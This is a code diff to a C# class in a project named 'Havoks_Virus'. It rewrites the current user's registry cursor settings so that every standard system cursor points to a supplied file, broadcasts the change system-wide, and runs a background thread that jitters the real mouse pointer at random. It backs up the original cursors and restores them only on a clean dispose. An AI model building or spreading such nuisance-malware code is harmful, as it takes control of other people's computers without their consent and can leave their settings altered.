@@ -10,59 +10,62 @@ using System.Windows.Forms;
 
 namespace Havoks_Virus
 {
-    public class Mouse
+    public class Mouse : IDisposable
     {
         [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
         private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
-        private static extern IntPtr CreateIconFromResource(byte[] pbIconBits, uint cbIconBits, bool fIcon, uint dwVersion);
+        private const int SPI_SETCURSORS = 0x0057;
+        private const int SPIF_UPDATEINIFILE = 0x01;
+        private const int SPIF_SENDCHANGE = 0x02;
 
-        private Cursor animatedCursor;
+        private Dictionary<string, string> originalCursors = new Dictionary<string, string>();
         private Thread movementThread;
         private volatile bool keepMoving = true; // Use volatile for thread safety
+        private bool disposed = false; // Flag to indicate disposal
+        private string aniCursorPath;
 
         public Mouse(string cursorFilePath)
         {
+            aniCursorPath = cursorFilePath;
             try
             {
-                animatedCursor = LoadAnimatedCursor(cursorFilePath);
-                ApplyCursor();
+                BackupAndApplyCursors(aniCursorPath);
+                StartMouseMovement();
             }
             catch (Exception ex)
             {
-                // Handle the exception (e.g., log it) and provide a fallback cursor
-                System.Console.WriteLine($"Error loading cursor: {ex.Message}");
-                animatedCursor = Cursors.Default; // Fallback cursor
+                System.Console.WriteLine($"Error applying cursor: {ex.Message}");
             }
-
-            // Start the mouse movement thread
-            StartMouseMovement();
         }
 
-        private Cursor LoadAnimatedCursor(string cursorFilePath)
+        private void BackupAndApplyCursors(string curFile)
         {
-            byte[] cursorBytes = File.ReadAllBytes(cursorFilePath);
-            IntPtr hCursor = CreateIconFromResource(cursorBytes, (uint)cursorBytes.Length, false, 0x00030000);
-            if (hCursor == IntPtr.Zero)
-                throw new ApplicationException("Could not create cursor from resource.");
+            string[] cursorTypes = new string[]
+            {
+                "Arrow", "Hand", "IBeam", "No", "SizeAll", "SizeNESW", "SizeNS", "SizeNWSE", "SizeWE",
+                "UpArrow", "Wait", "Cross", "Help", "AppStarting"
+                // Add more cursor types if necessary
+            };
 
-            return new Cursor(hCursor);
+            foreach (string cursorType in cursorTypes)
+            {
+                originalCursors[cursorType] = Registry.GetValue(@"HKEY_CURRENT_USER\Control Panel\Cursors\", cursorType, null) as string;
+                ChangeCursor(cursorType, curFile);
+            }
         }
 
-        public void ApplyCursor()
+        private void ChangeCursor(string cursorType, string curFile)
         {
-            Cursor.Current = animatedCursor;
+            Registry.SetValue($@"HKEY_CURRENT_USER\Control Panel\Cursors\", cursorType, curFile);
+            SystemParametersInfo(SPI_SETCURSORS, 0, IntPtr.Zero, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
         }
 
         public void StartMouseMovement()
         {
             if (movementThread == null || !movementThread.IsAlive)
             {
-                movementThread = new Thread(new ThreadStart(RandomlyMoveMouse))
-                {
-                    IsBackground = true
-                };
+                movementThread = new Thread(new ThreadStart(RandomlyMoveMouse)) { IsBackground = true };
                 movementThread.Start();
             }
         }
@@ -70,10 +73,8 @@ namespace Havoks_Virus
         private void RandomlyMoveMouse()
         {
             Random rnd = new Random();
-
             while (keepMoving)
             {
-                // Generate a random X and Y offset for wiggling
                 int offsetX = rnd.Next(-5, 6); // Random X-offset between -5 and 5
                 int offsetY = rnd.Next(-5, 6); // Random Y-offset between -5 and 5
 
@@ -82,7 +83,6 @@ namespace Havoks_Virus
                     Cursor.Position.Y + offsetY
                 );
 
-                // Sleep for a random duration between 300 and 500 milliseconds
                 Thread.Sleep(rnd.Next(300, 501)); // Random sleep duration between 0.3 and 0.5 seconds
             }
         }
@@ -94,21 +94,42 @@ namespace Havoks_Virus
             {
                 movementThread.Join();
             }
-            ResetCursorToDefault();
+            RestoreOriginalCursors();
         }
 
-        private void ResetCursorToDefault()
+        private void RestoreOriginalCursors()
         {
-            Cursor.Current = Cursors.Default;
+            foreach (var entry in originalCursors)
+            {
+                Registry.SetValue($@"HKEY_CURRENT_USER\Control Panel\Cursors\", entry.Key, entry.Value);
+            }
+            SystemParametersInfo(SPI_SETCURSORS, 0, IntPtr.Zero, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+        }
+
+        protected virtual void Dispose(bool disposing)
+        {
+            if (!disposed)
+            {
+                if (disposing)
+                {
+                    // Dispose managed resources.
+                    StopMouseMovement(); // This also calls RestoreOriginalCursors
+                }
+                // Note: No unmanaged resources in this class, no need to free them
+
+                disposed = true;
+            }
+        }
+
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
         }
 
         ~Mouse()
         {
-            StopMouseMovement();
-            if (animatedCursor != null)
-            {
-                animatedCursor.Dispose();
-            }
+            Dispose(false);
         }
     }
 }
